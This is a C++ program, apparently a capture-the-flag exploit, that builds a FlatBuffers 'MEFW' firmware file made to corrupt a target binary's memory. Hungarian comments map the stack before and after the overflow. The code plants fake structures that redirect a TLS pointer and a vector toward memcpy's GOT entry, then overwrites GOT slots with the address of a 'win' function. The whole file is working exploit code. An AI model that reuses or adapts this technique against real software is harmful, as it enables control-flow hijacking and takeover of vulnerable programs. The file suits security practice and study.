#include "mefw_generated.h"
#include <stdio.h>
#include <iostream>

int main(int argc, char* argv[]) {
    flatbuffers::FlatBufferBuilder builder(10240000);

    std::vector<flatbuffers::Offset<me::Chunk>> chunks;

    auto cchunk = 18;
    auto chunkSize = 0x40;
    auto size = chunkSize * cchunk; 

    char data[size];
    for(int i=0;i<size;i++){
        data[i] = (i/8) & 0xff;
    }


    /* ilyen most:
        0x7fffffffd888: 0x00007fffffffd920      // ezt meg nem mi rakjuk oda, tok veletlenul itt van            <----+
                                                                                                                     |
        0x7fffffffd920: 0x8080808080808080      // itt kezdodik a buffer                                             |
        0x7fffffffd928: 0x8080808080808080                                                                           |
        0x7fffffffd930: 0x8080808080808080                                                                           |
        0x7fffffffd938: 0x8080808080808080                                                                           |
        0x7fffffffd940: 0x8080808080808080                                                                           |
        0x7fffffffd948: 0x00007fffffffd950                                                                           |
        0x7fffffffd950: 0x00007fffffffd960                                                                           |
        0x7fffffffd958: 0x0000000000000000                                                                           |
        0x7fffffffd960: 0x0000000000000011                                                                           |
        0x7fffffffd968: 0x0000000000408c70      //  memcpy@got.plt - valamennyi amivel offseteli kesobb
        0x7fffffffd970: 0x0000000000000000                                                                           |
        0x7fffffffd978: 0x8080808080808080                                                                           |
        0x7fffffffd980: 0x8080808080808080                                                                           |
        0x7fffffffd988: 0x8080808080808080                                                                           |
        0x7fffffffd990: 0x8080808080808080                                                                           |

        0x7fffffffdcc8: 0x8080808080808080                                                                           |
        0x7fffffffdcd0: 0x8080808080808080                                                                           |
        0x7fffffffdcd8: 0x8080808080808080                                                                           |
        0x7fffffffdce0: 0x8080808080808080                                                                           |
        0x7fffffffdce8: 0x8080808080808080                                                                           |
        0x7fffffffdcf0: 0x00007fffffffd820      // ez a pointer a mytls-re, amit fejbenyomunk ez + 0x68 mutat ide  --+
        0x7fffffffdcf8: 0x8080808080808080
        0x7fffffffdd00: 0x8080808080808080
        0x7fffffffdd08: 0x8080808080808080
        0x7fffffffdd10: 0x8080808080808080
        0x7fffffffdd18: 0x8080808080808080

    */

      /* ilyen lesz:

        ppMyTls:          0x000000409170: 0x00007fffffffdcf0  -----------------------------------------------+             
                                                                                                             |
        pFwHeader:        0x000000409178: 0x000000000041e208  --+                   <-------------------+    |
                                          .......               |                                       |    |
        fwHeader:         0x00000041e208: xxxxxxxxxxxxxxxxxx  <-+                                       |    |
                          0x00000041e210: xxxxxxxxxxxxxxxxxx                                            |    |  
                          0x00000041e218: xxxxxxxxxxxxxxxxxx                                            |    |
                          0x00000041e220: xxxxxxxxxxxxxxxxxx                                            |    |
                          0x00000041e228: xxxxxxxxxxxxxxxxxx                                            |    |
                          0x00000041e230: 0x000000000041e280  --+                                       |    |
                                          .......               |                                       |    |
                                                                |                                       |    |
        addr_vector:      0x00000041e280: 0x000000000041e2c0  <-+   ---+  ez a vektor elso eleme        |    |                          
                          0x00000041e288: 0x0000000000000000           |                                |    |                                                                          
                          0x00000041e290: 0x0000000000000011         <-+                                |    |                                                                              
                          0x00000041e298: 0x0000000000408c70       memcpy@got.plt - some offset         |    |                                                                              
                          0x00000041e2a0: 0x0000000000000000                                            |    |                                                                              
                          0x00000041e2a8: 0x8080808080808080                                            |    |                
                                        .......                                                         |    |   
                                                                                                        |    |
        buf:              0x7fffffffd920: 0x000000000041e2c0       itt a file meg1x lekopizva           |    |  
                          0x7fffffffd928: 0x0000000000000000                                            |    |   
                          0x7fffffffd930: 0x0000000000000011                                            |    |                                                  
                          0x7fffffffd938: 0x0000000000408c70                                            |    |
                          0x7fffffffd940: 0x0000000000000000                                            |    |
                          0x7fffffffd948: 0x8080808080808080                                            |    |
                                        .......                                                         |    |
                                                                                                        |    |
                          0x7fffffffdce8: 0x8080808080808080                                            |    |
        pMyTls            0x7fffffffdcf0: 0x0000000000409110                     ez + 0x68 mutat ide ---+  <-+
                          0x7fffffffdcf8: 0x8080808080808080
                                        .......


    */
    auto addr_win               = 0x0000000000401e18;
    auto addr_pFwHeader         = 0x0000000000409178;
    auto addr_fwHeader          = 0x000000000041e208;
    auto addr_memcpy_got_plt    = 0x0000000000409070;

    auto addr_vector            = 0x000000000041e7f0;
    auto addr_first_vector_item = addr_vector + 0x10;
   

    ulong* paddr = (ulong*)data;
    paddr[0] = addr_first_vector_item;
    paddr[1] = 0;
    paddr[2] = 0x0000000000000011;
    paddr[3] = addr_memcpy_got_plt - 0x400;
    paddr[4] = 0x0000000000000000;

    // for (int i=0x60;i<0x80;i++) {
    //      
    // }

    paddr[0x7a] = addr_pFwHeader - 0x68;

    paddr[0x80] = addr_win;
    paddr[0x81] = 0x00000000004010f6;
    paddr[0x82] = 0x0000000000401106;
    paddr[0x83] = 0x0000000000401116;
    paddr[0x84] = 0x0000000000401126;
    paddr[0x85] = 0x0000000000401136;
    paddr[0x86] = 0x0000000000401146;
    paddr[0x87] = 0x0000000000401156;


    for(int ichunk = 0; ichunk < cchunk; ichunk++){
        std::vector<uint8_t> vecData;
        for(int i=0;i<chunkSize;i++){
            vecData.push_back(data[ichunk * chunkSize + i]);
        }

        auto data_vector = builder.CreateVector(vecData);
        auto chunk = me::CreateChunk(builder, data_vector);

        chunks.push_back(chunk);
    }
    auto chunk_vector = builder.CreateVector(chunks);
    auto file = me::CreateFile(builder, 
        builder.CreateString("/home/bup/ct"),
        cchunk,
        0,
        chunk_vector
    );

    
    std::vector<flatbuffers::Offset<me::File>> files;
    files.push_back(file);
    auto file_vector = builder.CreateVector(files);

    auto fwHeader = me::CreateFwHeader(builder, 0x1337, 0x1337, 0, file_vector, 0, 0, 0, addr_vector, addr_vector+8);

    builder.Finish(fwHeader, "MEFW");

    uint8_t *buf = builder.GetBufferPointer();
    int builderSize = builder.GetSize();

    // std::cout << "write input " << size << "\n";
    FILE* pFile;
    pFile = fopen("input", "wb");
    fwrite(buf, 1, builderSize, pFile);
    fclose(pFile);
    return 0;

}